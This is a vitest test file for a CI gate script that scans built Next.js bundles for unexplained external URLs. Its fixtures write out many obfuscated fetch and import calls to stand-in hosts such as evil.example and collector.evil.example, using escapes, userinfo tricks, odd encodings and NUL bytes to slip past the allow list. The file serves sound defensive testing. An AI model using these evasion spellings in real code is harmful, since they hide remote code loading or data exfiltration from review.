import {spawnSync} from "node:child_process";
import {mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync} from "node:fs";
import {tmpdir} from "node:os";
import {dirname, join} from "node:path";
import {fileURLToPath} from "node:url";

import {afterEach, beforeEach, describe, expect, it} from "vitest";

// Step 7 of ci-web.sh relies on nothing but the exit code of scripts/check-web-bundle.mjs, so the tests of
// the helper functions cannot say whether the gate still fails. These run the script itself, as CI does, on a
// temporary tree of two tiny apps.

const script = fileURLToPath(new URL("../../../scripts/check-web-bundle.mjs", import.meta.url));

const ALLOW = [
  "url http://www.w3.org/2000/svg # svg namespace",
  "host nextjs.org # docs",
  "url https://only-panel.test # a string of the panel's bundle",
].join("\n");

describe("scripts/check-web-bundle.mjs as a command", () => {
  let dir: string;
  const put = (path: string, content: string | Buffer) => {
    mkdirSync(dirname(join(dir, path)), {recursive: true});
    writeFileSync(join(dir, path), content);
  };
  const run = (...args: string[]) => {
    const r = spawnSync(process.execPath, [script, "--root", dir, ...args], {encoding: "utf8"});
    return {code: r.status, out: r.stdout + r.stderr};
  };

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "ctrlz-bundle-cli-"));
    put("tools/web-lint/bundle-url-allow.txt", ALLOW);
    put("apps/panel/.next/static/chunks/app.js", 'var a="http://www.w3.org/2000/svg", b="https://only-panel.test";');
    put("apps/panel/.next/standalone/node_modules/next/dist/server.js", "// https://nextjs.org/docs\n");
    put("apps/admin/.next/static/chunks/app.js", 'var a="http://www.w3.org/2000/svg";');
    put("apps/admin/.next/standalone/node_modules/next/dist/server.js", "// https://nextjs.org/docs\n");
  });
  afterEach(() => rmSync(dir, {recursive: true, force: true}));

  it("exits 0 when every string is explained, and says so", () => {
    const r = run();
    expect(r.code).toBe(0);
    expect(r.out).toContain("every URL string is explained");
  });

  it("exits 1 on a string that nothing explains, in either app", () => {
    put("apps/admin/.next/static/chunks/new.js", 'fetch("https://cdn.example/lib.js")');
    const r = run();
    expect(r.code).toBe(1);
    expect(r.out).toContain("cdn.example");
    expect(r.out).toContain("FAILED");
    expect(run("--app", "panel").code, "the panel alone is clean").toBe(0);
    expect(run("--app", "admin").code).toBe(1);
  });

  it("exits 1 on a scheme-relative string, which the first version of the pattern missed", () => {
    put("apps/panel/.next/static/chunks/new.js", 'link.href = "//fonts.example/css"');
    expect(run().code).toBe(1);
  });

  it("never prints the userinfo or the path of a string it reports, nor a query", () => {
    put("apps/panel/.next/static/chunks/a.js", 'x = "https://hooks.example/services/T0/B0/PATHSECRET"');
    put("apps/panel/.next/static/chunks/b.js", 'x = "https://svc:USERPW@api.example/v1?key=QUERYSECRET"');
    put("apps/panel/.next/static/chunks/c.js", 'x = "wss://ws.example/bot12345:TELEGRAMTOKEN/x"');
    const r = run();
    expect(r.code).toBe(1);
    expect(r.out).toContain("hooks.example");
    expect(r.out).toContain("api.example");
    expect(r.out).toContain("ws.example");
    for (const secret of ["PATHSECRET", "USERPW", "QUERYSECRET", "TELEGRAMTOKEN", "bot12345", "svc:"]) expect(r.out, secret).not.toContain(secret);
  });

  it("never prints the user name or the start of a password when the userinfo holds a cut character (wp5-r2-5)", () => {
    const urls = [
      "https://deploy:Xy7?Qp9#zz@registry.example.ir/v2",
      "https://svc:Ab3/kL9+Zq==@api.example.ir/v1",
      "https://admin:S3cr;et@h.example/x",
      "https://ci-bot:ghp_AAAABBBBCCCCDDDD)x@github.com",
    ];
    urls.forEach((url, i) => put(`apps/panel/.next/static/chunks/u${i}.js`, `x = "${url}"`));
    const r = run();
    expect(r.code).toBe(1);
    expect(r.out).toContain("authority of");
    for (const secret of ["deploy", "Xy7", "Ab3", "kL9", "S3cr", "ci-bot", "ghp_", "AAAA"]) expect(r.out, secret).not.toContain(secret);
  });

  it("never prints the account name or the first digits of a secret cut at a slash or an escaped quote (wp5-r3-6)", () => {
    put("apps/panel/.next/static/chunks/s1.js", 'x = "https://ci.bot:12345?pw/x@reg.example.ir/v2"');
    put("apps/panel/.next/static/chunks/s2.js", String.raw`x = "https://first.last:2024\"x@h.example"`);
    put("apps/panel/.next/static/chunks/s3.js", "x = 'https://deploy.bot:4321/aB9x@registry.example.ir'");
    const r = run("--app", "panel");
    expect(r.code).toBe(1);
    expect(r.out).toContain("authority of");
    for (const secret of ["ci.bot", "first.last", "deploy.bot", "12345", "2024", "4321", "aB9x"]) expect(r.out, secret).not.toContain(secret);
  });

  it("exits 1 on a scheme-relative address, which names no host a pattern of letters would find (wp5-r3-2)", () => {
    for (const [i, host] of ["1.2.3.4", "[::1]", "пример.рф"].entries()) put(`apps/panel/.next/static/chunks/h${i}.js`, `s.src = "//${host}/x.js"`);
    const r = run("--app", "panel");
    expect(r.code).toBe(1);
    expect(r.out).toContain("3 URL string(s)");
  });

  it("runs, and fails, when it is started through a symlink or a junction to its folder (wp5-r3-1)", () => {
    // `import.meta.url` is the real path of the script and `process.argv[1]` is the path as typed. Compared as
    // they are, a link made the guard false: nothing ran and the exit code was 0, a green gate that scanned nothing.
    const link = join(dir, "linked-scripts");
    try {
      symlinkSync(dirname(script), link, "junction");
    } catch {
      return; // a platform that does not let this user make links; the realpath comparison is covered on the others
    }
    // An app that does not exist: by the real path this prints "does not exist" and exits 1.
    const viaLink = spawnSync(process.execPath, [join(link, "check-web-bundle.mjs"), "--root", dir, "--app", "nope"], {encoding: "utf8"});
    expect(viaLink.status).toBe(1);
    expect(viaLink.stdout + viaLink.stderr).toContain("does not exist");
    const viaLinkOk = spawnSync(process.execPath, [join(link, "check-web-bundle.mjs"), "--root", dir], {encoding: "utf8"});
    expect(viaLinkOk.status).toBe(0);
    expect(viaLinkOk.stdout).toContain("every URL string is explained");
  });

  it.runIf(process.platform === "win32")("runs when the path differs from the real one only in case (wp5-r3-1)", () => {
    const typed = script.replace(/scripts/, "SCRIPTS").replace(/^[a-z]:/i, (d) => d.toLowerCase());
    const r = spawnSync(process.execPath, [typed, "--root", dir, "--app", "nope"], {encoding: "utf8"});
    expect(r.status).toBe(1);
    expect(r.stdout + r.stderr).toContain("does not exist");
  });

  it("never prints the account name or the first digits of a password cut at a quote, a backtick, < , > or a space (wp5-r4-1)", () => {
    const BT = "`";
    const urls = [
      `x = "https://ci.bot:1234'5@reg.example.ir/v2"`,
      `x = "https://ci.bot:1234${BT}5@reg.example.ir/v2"`,
      `x = "https://ci.bot:1234<5@reg.example.ir/v2"`,
      `x = "https://ci.bot:1234>5@reg.example.ir/v2"`,
      `x = "https://ci.bot:1234 5@reg.example.ir/v2"`,
    ];
    urls.forEach((line, i) => put(`apps/panel/.next/static/chunks/q${i}.js`, line));
    const r = run("--app", "panel");
    expect(r.code).toBe(1);
    expect(r.out).not.toContain("ci.bot");
    expect(r.out).not.toContain("1234");
    expect(r.out).toContain("authority of");
  });

  it("explains no string that is cut inside its userinfo by a host line or an exact line, in a dependency or in the browser bundle (wp5-r4-5)", () => {
    put("tools/web-lint/bundle-url-allow.txt", `${ALLOW}\nurl https://x # a dummy base\nurl https://github.com # an exact line`);
    put("apps/panel/.next/standalone/node_modules/pkg/index.js", ['fetch("https://nextjs.org|x@evil.example/payload")', 'fetch("https://nextjs.org;x@evil.example/payload")'].join("\n"));
    put("apps/panel/.next/static/chunks/c.js", 'location.href = "https://x;@evil.example/a.js"; a = "https://github.com,x@evil.example/p"; b = "https://github.com)x@evil.example/p";');
    const r = run("--app", "panel");
    expect(r.code).toBe(1);
    expect(r.out).toContain("5 URL string(s)");
  });

  it("exits 1 on a file that starts with a NUL byte and holds an external string (wp5-r4-6)", () => {
    put("apps/panel/.next/static/chunks/nul.js", `/*${String.fromCharCode(0)}*/\nfetch("https://cdn.evil.example/x.js");`);
    const r = run("--app", "panel");
    expect(r.code).toBe(1);
    expect(r.out).toContain("cdn.evil.example");
  });

  it("exits 1 on an extensionless file that holds a NUL byte and an external string, which Node runs as JavaScript (wp5-r5-5)", () => {
    put("apps/panel/.next/standalone/node_modules/x/run", `/*${String.fromCharCode(0)}*/fetch("https://cdn.evil.example/w.js")`);
    put("apps/panel/.next/standalone/node_modules/x/a.mts", `${String.fromCharCode(0)}fetch("https://cdn.evil.example/m.js")`);
    put("apps/panel/.next/standalone/node_modules/x/a.cts", `${String.fromCharCode(0)}fetch("https://cdn.evil.example/c.js")`);
    const r = run("--app", "panel");
    expect(r.code).toBe(1);
    expect(r.out).toContain("3 URL string(s)");
  });

  it("says how many files it skipped as binary by name", () => {
    put("apps/panel/.next/standalone/node_modules/pkg/a.png", Buffer.from([0, 1, 2]));
    put("apps/panel/.next/standalone/node_modules/pkg/a.woff2", Buffer.from([0, 1, 2]));
    const r = run("--app", "panel");
    expect(r.code).toBe(0);
    expect(r.out).toContain("2 binary file(s) skipped");
  });

  it("exits 1 on a native addon or a WebAssembly module that holds an external string, and does not call them binary (wp5-r7-5)", () => {
    // Both run, and the same bytes under the name .so or .dat are scanned, so the name must not decide.
    put("apps/panel/.next/standalone/node_modules/pkg/foo.node", Buffer.from([0x7f, 0x45, 0, 1, ...Buffer.from('"https://cdn.evil.example/n"')]));
    put("apps/panel/.next/standalone/node_modules/pkg/foo.wasm", Buffer.from([0, 0x61, 0x73, 0x6d, 1, 0, ...Buffer.from('"https://cdn.evil.example/w"')]));
    const r = run("--app", "panel");
    expect(r.code).toBe(1);
    expect(r.out).toContain("2 URL string(s)");
    expect(r.out).not.toContain("binary file(s) skipped");
  });

  it("explains no string cut at an escaped quote, a path backslash or a space before an @, and exits 1 (wp5-r7-1 to wp5-r7-4)", () => {
    const BS = String.fromCharCode(92);
    put(
      "apps/panel/.next/standalone/node_modules/pkg/a.js",
      [
        `x = 'https://nextjs.org${BS}'.evil.example/x'`,
        `x = 'https://nextjs.org/docs${BS}'/a.zip'`,
        `x = "https://nextjs.org/docs${BS}${BS}x.js"`,
        'x = "https://nextjs.org @evil.example/x"',
      ].join(String.fromCharCode(10)),
    );
    put("apps/panel/.next/static/chunks/b.js", `f('https://only-panel.test${BS}'.evil.example/a.js'); g("https://only-panel.test @evil.example/a.js")`);
    const r = run("--app", "panel");
    expect(r.code).toBe(1);
    expect(r.out).toContain("5 URL string(s)"); // the two path cuts are the same string
    // and the same URLs in plain form still pass, so the failure above is the escape and not the host
    put("apps/panel/.next/standalone/node_modules/pkg/a.js", "x = 'https://nextjs.org/docs'; y = 'https://nextjs.org/docs/x';");
    put("apps/panel/.next/static/chunks/b.js", "f('https://only-panel.test'); g(\"https://only-panel.test \")");
    expect(run("--app", "panel").code).toBe(0);
  });

  it("explains no string that a JS escape sends to another host, and exits 1 (wp5-r5-1, wp5-r5-2, wp5-r5-3)", () => {
    const BS = String.fromCharCode(92);
    put("apps/panel/.next/standalone/node_modules/pkg/a.js", [`f("https://nextjs.org${BS}x40evil.example/x")`, `f("https://nextjs.org${BS}t.evil.example/p")`, 'f("https://nextjs.org;x.attacker.io:443/p")'].join(String.fromCharCode(10)));
    put("apps/panel/.next/static/chunks/b.js", `f("https://only-panel.test${BS}u0040evil.example/a.js")`);
    const r = run("--app", "panel");
    expect(r.code).toBe(1);
    expect(r.out).toContain("4 URL string(s)");
  });

  it("finds the spellings a browser resolves to another host (wp5-r4-7)", () => {
    const BS = String.fromCharCode(92);
    const spellings = [`"/${BS}${BS}evil.example/a.js"`, `"${BS}${BS}${BS}${BS}evil.example/a.js"`, `"https:${BS}${BS}${BS}${BS}evil.example/a.js"`, '"http:evil.example/a.js"', '"http:/evil.example/a.js"', '"ws:evil.example/x"'];
    spellings.forEach((s, i) => put(`apps/panel/.next/static/chunks/s${i}.js`, `x = ${s};`));
    const r = run("--app", "panel");
    expect(r.code).toBe(1);
    // The six spellings are four different strings: three of them read as //evil.example/a.js and two as http://evil.example/a.js.
    expect(r.out).toContain("4 URL string(s)");
  });

  it("does not let a documentation host explain a WebSocket string or an endpoint (wp5-r4-2)", () => {
    put("apps/panel/.next/standalone/node_modules/pkg/a.js", 'new WebSocket("wss://nextjs.org/socket"); fetch("https://nextjs.org/api/data");');
    const r = run("--app", "panel");
    expect(r.code).toBe(1);
    expect(r.out).toContain("2 URL string(s)");
  });

  it("does not let a documentation host explain a string whose userinfo looks like that host (wp5-r2-1)", () => {
    put("apps/panel/.next/standalone/node_modules/pkg/index.js", 'fetch("https://nextjs.org:pw@collector.evil.example/p")');
    const r = run("--app", "panel");
    expect(r.code).toBe(1);
    expect(r.out).toContain("collector.evil.example");
  });

  it("does not let a documentation host explain a release download or a raw view (wp5-r2-2, wp5-r2-6)", () => {
    put("apps/panel/.next/standalone/node_modules/pkg/a.js", 'x("https://nextjs.org/o/r/releases/latest/download/tool")');
    put("apps/panel/.next/standalone/node_modules/pkg/b.js", 'x("https://nextjs.org/o/r/blob/main/dist/loader.js?raw=true")');
    const r = run("--app", "panel");
    expect(r.code).toBe(1);
    expect(r.out).toContain("nextjs.org  [path of");
    expect(r.out).toContain("a.js");
    expect(r.out).toContain("b.js");
  });

  it("prints a string whole only with --reveal, which is for a local run", () => {
    put("apps/panel/.next/static/chunks/a.js", 'x = "https://hooks.example/services/PATHSECRET"');
    expect(run("--app", "panel", "--reveal").out).toContain("https://hooks.example/services/PATHSECRET");
  });

  it("exits 1 on a stale unscoped url line when both apps are scanned, and does not report it for one app", () => {
    put("tools/web-lint/bundle-url-allow.txt", `${ALLOW}\nurl https://gone.test # was in the bundle`);
    const both = run();
    expect(both.code).toBe(1);
    expect(both.out).toContain("stale allow line");
    expect(both.out).toContain("url https://gone.test");
    expect(run("--app", "panel").code).toBe(0);
  });

  it("only warns about a scoped url line or a host that matched nothing", () => {
    put("tools/web-lint/bundle-url-allow.txt", `${ALLOW}\nurl https://scoped.test in node_modules/x/ # elsewhere\nhost unused.test # elsewhere`);
    const r = run();
    expect(r.code).toBe(0);
    expect(r.out).toContain("matched nothing on this machine");
  });

  it("exits 1 when an app has not been built", () => {
    rmSync(join(dir, "apps/admin/.next"), {recursive: true});
    const r = run();
    expect(r.code).toBe(1);
    expect(r.out).toContain("next build");
  });

  it("exits 1 when the allow file has a line without a reason", () => {
    put("tools/web-lint/bundle-url-allow.txt", `${ALLOW}\nurl https://noreason.test`);
    const r = run();
    expect(r.code).toBe(1);
    expect(r.out).toContain("no reason");
  });

  it("exits 2 on an argument it does not know, and takes the allow file from --allow", () => {
    expect(run("--nope").code).toBe(2);
    put("elsewhere.txt", "url http://www.w3.org/2000/svg # only this one");
    // The allow file given by --allow replaces the default: the panel's other strings are now unexplained.
    expect(run("--allow", join(dir, "elsewhere.txt")).code).toBe(1);
  });

  it("exits 1 on a URL whose scheme is written with an escape, and on one whose host is changed by an escape (wp5-r6-1, wp5-r6-2)", () => {
    const BS = String.fromCharCode(92);
    for (const body of [
      `htt${BS}ps://cdn.evil.example/x.js`,
      `https://nextjs.org${BS}.evil.example/x`,
      `https://nextjs.org${BS}.evil.example/x`,
      `https://x${BS}100evil.example/a.js`,
      `https://nextjs.org${BS}-x.evil.example/x`,
    ]) {
      put("apps/panel/.next/static/chunks/esc.js", `fetch("${body}")`);
      put("apps/panel/.next/standalone/node_modules/next/dist/esc.js", `fetch("${body}")`);
      expect(run("--app", "panel").code, body).toBe(1);
    }
    put("apps/panel/.next/static/chunks/esc.js", "");
    put("apps/panel/.next/standalone/node_modules/next/dist/esc.js", `x = "https://nextjs.org/docs${BS}n"`);
    expect(run("--app", "panel").code, "a break after a complete URL is fine").toBe(0);
  });

  it("exits 1 on a path that a cut character hides, a quote of the other kind in a host, and text after a placeholder (wp5-r8-2, wp5-r8-3, wp5-r8-4)", () => {
    // The allow file here has `host nextjs.org` (node_modules only) and the exact line `url https://only-panel.test`.
    const BT = "`";
    const cases: [string, string][] = [
      ["apps/panel/.next/standalone/node_modules/next/dist/p.js", `fetch("https://nextjs.org/docs)/../dl/tool.tar.xz")`],
      ["apps/panel/.next/standalone/node_modules/next/dist/p.js", `fetch("https://nextjs.org/docs'/../dl/tool.tar.xz")`],
      ["apps/panel/.next/standalone/node_modules/next/dist/p.js", `fetch("https://nextjs.org'.evil.example/a.js")`],
      ["apps/panel/.next/standalone/node_modules/next/dist/p.js", `fetch(${BT}https://nextjs.org".evil.example/a.js${BT})`],
      ["apps/panel/.next/static/chunks/p.js", `fetch("https://only-panel.test'.evil.example/a.js")`],
      ["apps/panel/.next/standalone/node_modules/next/dist/p.js", `fetch(${BT}https://\${b}.cdn.evil.example/lib.js${BT})`],
    ];
    for (const [path, source] of cases) {
      put(path, source);
      const r = run("--app", "panel");
      expect(r.code, source).toBe(1);
      rmSync(join(dir, path));
      put(path, "");
    }
    expect(run("--app", "panel").code, "the tree is clean again").toBe(0);
  });

  it("exits 1 on a UTF-16 file under .next/static and public/, with or without a byte order mark (wp5-r6-3)", () => {
    const body = 'fetch("https://cdn.evil.example/x.js")';
    const le = Buffer.from(body, "utf16le");
    const be = Buffer.from(le).swap16();
    const files: Array<[string, Buffer]> = [
      ["apps/panel/.next/static/chunks/le.js", Buffer.concat([Buffer.from([0xff, 0xfe]), le])],
      ["apps/panel/.next/static/chunks/be.js", Buffer.concat([Buffer.from([0xfe, 0xff]), be])],
      ["apps/panel/public/le.svg", Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from('<image href="https://cdn.evil.example/p.png"/>', "utf16le")])],
      ["apps/panel/.next/static/chunks/nobom.js", le],
    ];
    for (const [path, content] of files) {
      put(path, content);
      const r = run("--app", "panel");
      expect(r.code, path).toBe(1);
      expect(r.out, path).toContain("cdn.evil.example");
      put(path, "");
    }
  });

  it("exits 1 on a NUL-prefixed chunk with a scheme-relative Unicode host (wp5-r6-3)", () => {
    put("apps/panel/.next/static/chunks/nul.js", Buffer.from(`/*${String.fromCharCode(0)}*/import("//пример.рф/x.js")`, "utf8"));
    expect(run("--app", "panel").code).toBe(1);
  });

  it("reads the allow file it was given whichever order --allow and --root come in (wp5-r4-4)", () => {
    put("elsewhere.txt", "url http://www.w3.org/2000/svg # only this one");
    const allowFile = join(dir, "elsewhere.txt");
    // The default file under --root explains every string, so exit 0 means the --allow file was ignored.
    const spawn = (...args: string[]) => spawnSync(process.execPath, [script, ...args], {encoding: "utf8"}).status;
    expect(spawn("--root", dir, "--allow", allowFile, "--app", "panel")).toBe(1);
    expect(spawn("--allow", allowFile, "--root", dir, "--app", "panel")).toBe(1);
    expect(spawn("--root", dir, "--app", "panel")).toBe(0);
  });

  it("exits 1 on a stylesheet and on an SVG that spell a CDN URL with a CSS hex escape or an HTML character reference (wp5-r9-2)", () => {
    const BS = String.fromCharCode(92);
    put("apps/panel/.next/static/css/a.css", `a{background:url(https:${BS}2f${BS}2fcdn.evil.example/x.png)} @import url("${BS}68ttps://fonts.evil.example/a.css");`);
    put("apps/panel/public/b.svg", '<svg><image href="https:&#47;&#47;img.evil.example/p.png"/><a href="&#104;ttps://link.evil.example/x"/></svg>');
    const r = run("--app", "panel");
    expect(r.code).toBe(1);
    for (const host of ["cdn.evil.example", "fonts.evil.example", "img.evil.example", "link.evil.example"]) expect(r.out, host).toContain(host);
  });

  it("exits 1 on a template literal that builds a download URL, and on a scheme-relative one whose host starts with a placeholder (wp5-r9-1, wp5-r9-5)", () => {
    put(
      "apps/panel/.next/standalone/node_modules/pkg/a.js",
      ["x = `https://nextjs.org/docs/${p}.tar.gz`;", "y = `https://nextjs.org/${p}/x.zip`;", "z = `//${b}.cdn.evil.example/lib.js`;"].join(String.fromCharCode(10)),
    );
    const r = run("--app", "panel");
    expect(r.code).toBe(1);
    expect(r.out).toContain("3 URL string(s)");
    // a plain documentation link, and a path join, still pass
    put("apps/panel/.next/standalone/node_modules/pkg/a.js", "x = 'https://nextjs.org/docs/page'; y = `${base}//${path}`;");
    expect(run("--app", "panel").code).toBe(0);
  });

  it("does not let an exact url line explain a string that climbs to another path on its host (wp5-r9-4)", () => {
    put("tools/web-lint/bundle-url-allow.txt", `${ALLOW}\nurl https://github.com/vercel/next.js # a repository page`);
    put("apps/panel/.next/static/chunks/b.js", 'x = "https://github.com/vercel/next.js";');
    expect(run("--app", "panel").code).toBe(0);
    put("apps/panel/.next/static/chunks/b.js", 'x = "https://github.com/vercel/next.js)/../../o/r/releases/download/v1/tool";');
    const r = run("--app", "panel");
    expect(r.code).toBe(1);
    expect(r.out).toContain("github.com");
  });

  it("exits 1 on a scheme-relative host with an underscore or a non-ASCII dot, and on an HTML reference with leading zeros (wp5-r10-1, wp5-r10-5)", () => {
    const hosts: Array<[string, string]> = [
      ['x = "//my_bucket.s3.amazonaws.com/x.js"', "my_bucket.s3.amazonaws.com"],
      ['x = "//cdn。evil。com/x.js"', "cdn.evil.com"],
    ];
    for (const [source, host] of hosts) {
      put("apps/panel/.next/static/chunks/new.js", source);
      const r = run("--app", "panel");
      expect(r.code, source).toBe(1);
      expect(r.out, source).toContain(host);
    }
    put("apps/panel/.next/static/chunks/new.js", "");
    put("apps/panel/public/a.html", '<a href="&#00000000104;ttps://cdn.evil.example/a.css"><a href="&#x0000068;ttps://cdn2.evil.example/a.css">');
    const r = run("--app", "panel");
    expect(r.code).toBe(1);
    expect(r.out).toContain("cdn.evil.example");
    expect(r.out).toContain("cdn2.evil.example");
  });

  it("exits 1 on a stylesheet that mixes a CSS hex escape with an identity escape (wp5-r10-4)", () => {
    const BS = String.fromCharCode(92);
    put("apps/panel/.next/static/css/a.css", `a{background:url(htt${BS}p:${BS}2f/cdn.evil.example/x.png)}`);
    const r = run("--app", "panel");
    expect(r.code).toBe(1);
    expect(r.out).toContain("cdn.evil.example");
  });

  it("exits 1 on a built URL and on a template whose remainder an exact line cannot name (wp5-r10-2, wp5-r10-3)", () => {
    put(
      "tools/web-lint/bundle-url-allow.txt",
      `${ALLOW}\nurl https://\${b in .next/server/chunks/ # a template that closes at its host\nurl https://nextjs.org/docs/messages/\${r in node_modules/next/dist/ # docs links`,
    );
    put("apps/panel/.next/standalone/node_modules/next/dist/ok.js", "x = `https://nextjs.org/docs/messages/${r}`;");
    put("apps/panel/.next/standalone/apps/panel/.next/server/chunks/ok.js", "x = new URL(`https://${b}`);");
    expect(run("--app", "panel").code).toBe(0);
    const bad: Array<[string, string]> = [
      ["apps/panel/.next/standalone/node_modules/pkg/a.js", 'x = "https://nextjs.org/docs/" + p + ".tar.gz";'],
      ["apps/panel/.next/standalone/node_modules/pkg/a.js", 'x = "https://nextjs.org/docs/".concat(p, ".tar.gz");'],
      ["apps/panel/.next/standalone/node_modules/pkg/a.js", "x = `https://nextjs.org/docs/page?${q}`;"],
      ["apps/panel/.next/standalone/node_modules/next/dist/ok.js", "x = `https://nextjs.org/docs/messages/${r}/../../../dl/x.tar.xz`;"],
      ["apps/panel/.next/standalone/apps/panel/.next/server/chunks/ok.js", "x = `https://${b}/releases/download/v1/tool`;"],
    ];
    for (const [path, source] of bad) {
      const before = run("--app", "panel").code;
      expect(before, "the tree is clean before the string goes in").toBe(0);
      put(path, source);
      const r = run("--app", "panel");
      expect(r.code, source).toBe(1);
      put("apps/panel/.next/standalone/node_modules/next/dist/ok.js", "x = `https://nextjs.org/docs/messages/${r}`;");
      put("apps/panel/.next/standalone/apps/panel/.next/server/chunks/ok.js", "x = new URL(`https://${b}`);");
      put("apps/panel/.next/standalone/node_modules/pkg/a.js", "");
    }
    // 16 spawns of the check, one to three seconds each on a quiet machine and several times that beside a build or a Playwright run: the
    // default 60 s of vitest.config.ts is not enough, and a red unit step stops ci-web.sh before the bundle steps run (gate-r24-1).
  }, 300_000);

  it("scans a file with a very long run in time, and still finds the URL after it (wp5-r11-1)", () => {
    const BS = String.fromCharCode(92);
    // Each of these took minutes before the runs were anchored (200,000 characters, quadratic).
    for (const padding of [String.fromCharCode(10).repeat(200_000), BS.repeat(200_000), (BS + "t").repeat(100_000), ".".repeat(200_000)]) {
      put("apps/panel/.next/static/chunks/pad.js", padding + 'fetch("https://padded.example/x.js")');
      const started = Date.now();
      const r = run("--app", "panel");
      expect(r.code).toBe(1);
      expect(r.out).toContain("padded.example");
      expect(Date.now() - started, "seconds for one padded file").toBeLessThan(15_000);
    }
  }, 120_000);

  it("follows a link into node_modules, as pnpm lays them out, and survives a link that loops", () => {
    const real = join(dir, "store/pkg");
    mkdirSync(real, {recursive: true});
    writeFileSync(join(real, "index.js"), 'fetch("https://linked.example/x")');
    const linkDir = join(dir, "apps/panel/.next/standalone/node_modules");
    mkdirSync(linkDir, {recursive: true});
    try {
      symlinkSync(real, join(linkDir, "pkg"), "junction");
      symlinkSync(join(dir, "apps/panel/.next/standalone"), join(real, "loop"), "junction");
    } catch {
      return; // a platform that does not let this user make links: the case is covered where it can
    }
    const r = run("--app", "panel");
    expect(r.code).toBe(1);
    expect(r.out).toContain("linked.example");
  });
});
